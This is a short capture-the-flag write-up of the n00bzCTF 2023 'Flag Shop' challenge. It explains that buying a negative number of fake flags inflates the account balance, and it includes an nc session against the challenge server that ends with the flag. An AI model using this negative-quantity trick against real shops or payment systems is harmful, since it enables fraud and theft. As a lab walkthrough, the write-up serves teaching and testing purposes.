### Flag Shop

![Flag Shop](https://github.com/Hed6eH0g/ctf/blob/main/2023/n00bzctf/pwn/flag_shop/flag_shop_0.png)

In this challenge, we can interact with the server according to the options.
We can find that the initial balance is set to $100 and $1337 seems to be required to obtain the flag.
Checking available options and brief trials for increasing the balance to confirm the behavior of the server.
Then, it was found that a negative value for buying the fake flag is allowed.
By exploiting this vulnerability, we can increase our own balance and buy the real flag as follows:

```
$  nc challs.n00bzunit3d.xyz 50267
Welcome to the flag shop! The flag costs $1337 but you have $100. You can buy the fake flag which costs $50
[1] Buy real flag - $1337
[2] Buy fake flag - $50
[3] Check account balance
3
$100
[1] Buy real flag - $1337
[2] Buy fake flag - $50
[3] Check account balance
2
How many?
-30
[1] Buy real flag - $1337
[2] Buy fake flag - $50
[3] Check account balance
3
$1600
[1] Buy real flag - $1337
[2] Buy fake flag - $50
[3] Check account balance
1
How many?
1
n00bz{5h0p_g0t_h3ck3d_4nd_fl4g_g0t_570l3n!}
```